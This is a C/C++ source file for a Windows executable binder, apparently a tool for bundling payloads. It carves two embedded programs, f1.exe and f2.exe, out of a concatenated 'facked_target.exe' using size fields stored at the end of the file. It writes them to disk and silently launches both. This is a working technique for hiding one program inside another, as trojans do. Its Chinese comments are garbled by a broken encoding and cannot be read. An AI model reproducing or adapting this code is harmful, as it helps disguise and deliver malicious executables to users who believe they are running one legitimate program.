//http://52sye.com/NewsInfo/1347405.html
//facked_target�令��L�W�r�Af1.exe��f2.exe�]�O�Af1��f2���ͪ����|�M���}���|�@�P 
//|target.exe|test1.exe|test2.exe|len1|len2|
#include <stdio.h>
#include<iostream>
#include<io.h>
//#include <string.h>
//#include <stdlib.h>

int main(int argc, char *argv[]){//�p�Gf1.exe �M f2.exe���s�b�A�h���s����    
    if(access("f1.exe",0) < 0 || access("f2.exe",0) < 0){ //��target���tmp.exe���e���A�ò���facked_target.exe 
    	long SourceLength = 0;//Ū���ɮת�����
		long TargetLength = 0;//
		char file1_len_buffer[30];//f1���ɮפj�p������m 
    	char file2_len_buffer[30];//f2���ɮפj�p������m  
    	long f1_size=0,f2_size=0;
    	FILE *fp,*fp1,*fp2;//facked_target.exe �s���ɮ�1 �s���ɮ�2 
    	
    	if(access("facked_target.exe",0) < 0)//�Ĥ@���n���A����P�_�ۤv�s�b��N���ΦA����		 
            system("copy /b target.exe+tmp.exe facked_target.exe"); 

        fp=fopen("facked_target.exe","rb");// localfile�ɦW
        if(NULL == fp){
    	}
		else{//�Q��facked_target.exe�A�ͦ�f1.exe�Mf2.exe        
        	fseek(fp, 0, SEEK_END);/* SEEK_END �첾���_���} = �ɮ׵��� */
        	SourceLength = ftell(fp);/* �o��facked_target.exe�j�p */ 		           
       
			fseek(fp, 0-60, SEEK_END);//��30+30��f1�Mf2���ɮפj�p������         
   
        	for(int i=0;i<30;i++)
       		 	fread(&file1_len_buffer[i], sizeof(char), 1, fp);   
			     	      
			for(int i=0;i<30;i++)
        		fread(&file2_len_buffer[i], sizeof(char), 1, fp);        	       	
		    			
	        for(int i=0;i<30;i++){	
	    	    long ten=1;			
	    		for(int j=0;j<30-i;j++){
		   	 		if(j==0){			
		    		  ten=1;
					      //printf("ten=%d\n", ten);
		        	}
			    	else{		
			        	ten*=10;
	     	    	}
		    	}				
		        f1_size = f1_size + ((int)file1_len_buffer[i]-48)* ten;		
			    f2_size = f2_size + ((int)file2_len_buffer[i]-48)* ten;		
	        }
		    
    	   	//f1_size=atoi(file1_len_buffer);
    	    //f2_size=atoi(file2_len_buffer);
    	    //printf("f1_size=%d, f2_size=%d\n",f1_size,f2_size);
    	    //system("pause");
        
    	    TargetLength = SourceLength-f1_size-f2_size-60;/* �o��target.exe���j�p */ 

			fseek(fp, TargetLength, SEEK_SET);//�����ɮ�1����m       
			unsigned char *f1_buff = new unsigned char[f1_size];//���t�w�İϵ��ɮ�1 				
        	for(int i=0;i<f1_size;i++)//Ū�X�ӡA���ͷs���ɮ�
        		fread(&f1_buff[i], sizeof(char), 1, fp);        	
            
        	fp1=fopen("f1.exe","wb");// localfile�ɦW 
        
        	if( NULL == fp1 ){
        	}
			else{  
			    for(int i=0;i<f1_size;i++)
		       		fwrite(&f1_buff[i],1,sizeof(char),fp1);
	       
	    	   	//free(f1_buff);
			    fclose(fp1);
		   
			    system("start f1.exe"); //�Ұ�f1.exe		   
			} 
			         
    	    fseek(fp, TargetLength+f1_size, SEEK_SET);//�����ɮ�2����m      
			unsigned char *f2_buff = new unsigned char[f2_size];//���t�w�İϵ��ɮ�2 				
    	    for(int i=0;i<f2_size;i++)//Ū�X�ӡA���ͷs���ɮ�
    	    	fread(&f2_buff[i], sizeof(char), 1, fp);        	
            
    	    fp2=fopen("f2.exe","wb");// localfile�ɦW 
        
    	    if( NULL == fp2 ){
    	    }
			else{  
			   for(int i=0;i<f2_size;i++)
			        fwrite(&f2_buff[i],1,sizeof(char),fp2);
	       
		       //free(f2_buff);
			   fclose(fp2);
		   
			   system("start f2.exe"); //�Ұ�f2.exe
			   //system("taskkill /f /im facked_target.exe");
			}     
		
		fclose(fp);     
    	}
    } 
    else{//f1��f2�����ɤw�g�s�b�A���ΦA���͡A�t�׸��� 
        system("start f2.exe"); 
    	system("start f1.exe");

	}                	         
    //system("taskkill /f /im facked_target.exe");
    return 0; 
}
